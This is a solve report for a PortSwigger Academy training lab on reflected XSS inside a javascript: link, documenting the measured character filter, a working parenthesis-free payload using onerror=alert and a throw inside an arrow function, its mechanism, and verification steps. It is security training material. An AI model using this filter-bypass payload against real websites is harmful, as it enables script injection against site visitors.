# Report — Reflected XSS in a JavaScript URL with some characters blocked

**Lab:** PortSwigger Web Security Academy, Cross-site scripting → Contexts
**Difficulty:** EXPERT
**Instance:** `https://0a4c002e0333a1ef80438a6f00b70076.web-security-academy.net/`
**Date:** 2026-11-06
**Outcome:** solved; lab header widget reports `is-solved` / `Solved`

## 1. Identification

| Item | Value |
|---|---|
| Page `<title>` | `Reflected XSS in a JavaScript URL with some characters blocked` |
| Difficulty badge (rendered by Academy JS) | **EXPERT** |
| Objective | reflected XSS that calls `alert` with `1337` in the message |
| Exploit server | none — `GET /exploit` → 404 |
| Detector | server-side (crafted request flips the widget) |

The difficulty is not present in the Academy page's static HTML (the badge is
rendered client-side), so it was read from the rendered page rather than
guessed or copied from a write-up. One blog-style write-up labelled this lab
"Expert"; that matched the rendered badge.

## 2. The sink

Every post page ends with a back-link built from the current query string:

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d1'}).finally(_ => window.location = '/')">Back to Blog</a>
```

`body:'…'` contains the **entire** query string, percent-encoded. Adding our own
parameter therefore writes attacker text into a single-quoted JavaScript string
— a classic script-context reflection reached through a `javascript:` URL.

## 3. The filter, measured rather than assumed

The lab claims "some characters blocked". Rather than take that from a write-up,
each character was sent as a second parameter and the rendered href compared
(see `SOLUTION.md` §2 for the table). Result:

* **deleted:** `(`, `)`, `[`, `]`, `%`, backtick, space
* **escaped for the JS string:** `'`, `"`, `<`, `>`, `&`, `=`, `:`, `;`, `?`
* **allowed:** `{ } , * + - / ! . ~ | $`

The escaping is the trap: it looks like a defence, but a `javascript:` URL is
percent-decoded by the browser **before** evaluation, so `%27` comes back as `'`
and the string is escaped anyway.

Because parentheses are deleted, `alert(1337)` cannot be spelled. The vector
uses `onerror=alert` — assigning the function, not calling it — and
`throw/**/…`, since `/**/` is a legal comment standing in for the blocked space.

## 4. Payload

```
/post?postId=<id>&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

Executed form:

```js
fetch('/analytics', {method:'post',body:'/post?postId=1&'},
      x=x=>{throw/**/onerror=alert,1337}, toString=x, window+'', {x:''})
  .finally(_ => window.location = '/')
```

Mechanism, in order:

1. `'}` terminates the `body` string and the `fetch` options object.
2. `,x=x=>{…}` supplies an extra argument; inside an arrow function's block a
   `throw` statement is syntactically legal, which it is not in an expression.
3. `toString=x` (object-literal member) plus `window+''` force `window` to be
   converted to a string, invoking the arrow function.
4. The thrown value reaches the handler installed by `onerror=alert`.
5. `{x:'` re-opens a string so the trailing `'}).finally(…)` served by the app
   stays valid.

## 5. Verification

1. **Baseline, before any exploit traffic:** `GET /` →
   `widgetcontainer-lab-status is-notsolved` (`evidence/01-baseline-home.html`).
2. **Exploit request:** `/post?postId=5&…` → HTTP 200, reflected href contains
   `throw/**/onerror=alert,1337` after decoding
   (`evidence/02-exploit-response.html`).
3. **After:** `GET /` → `is-solved` and `<p>Solved</p>`
   (`evidence/03-home-after-exploit.html`).
4. **Real browser:** the exact URL the solver builds was opened in Chromium, the
   "Back to Blog" anchor clicked with `window.alert` hooked — `['Uncaught 1337']`
   (`evidence/browser-alert.txt`). So the payload is a genuine XSS, not just a
   string the checker greps for.

The instance is single-user and now solved; the recorded solver run therefore
prints `caused by solver: no (was already solved)` honestly, while steps 1–3
document that the flip happened on the first crafted request of this session.

## 6. Solver

`EXPERT/Reflected-XSS-in-a-JavaScript-URL-with-some-characters-blocked/solve.py`

* discovers the post id from the blog index (no hardcoded `postId`);
* derives the reflection from the live href and aborts if the query string is
  not spliced into `body:'…'` as expected;
* runs a control request proving `(` `)` `[` `]` are actually deleted, so the
  parenthesis-free shape is justified by the target, not by folklore;
* asserts the exploit reflection decodes to intact code before claiming anything;
* polls the lab widget for the solved state and reports requests + elapsed time.

Run:

```bash
uv run python solve.py --url "https://<lab-id>.web-security-academy.net"
```

Measured: **6 HTTP requests, 2.2 s**, exit 0. Through the repository launcher:
exact folder-name match, **2.6 s** total, exit 0. `tests/test_launcher.py`:
27 passed, 0 failed.

## 7. Notes / loose ends

* No fresh instance exists for this account, so the "solver flipped it from
  unsolved" claim cannot be re-demonstrated end-to-end; the before/after pair
  from this session is the evidence.
* The browser alert message is `Uncaught 1337` (the engine's stringification of
  the thrown value), which satisfies the "must contain 1337" objective.
* Reproducing by hand needs no exploit server: just open the crafted URL and
  click the link.
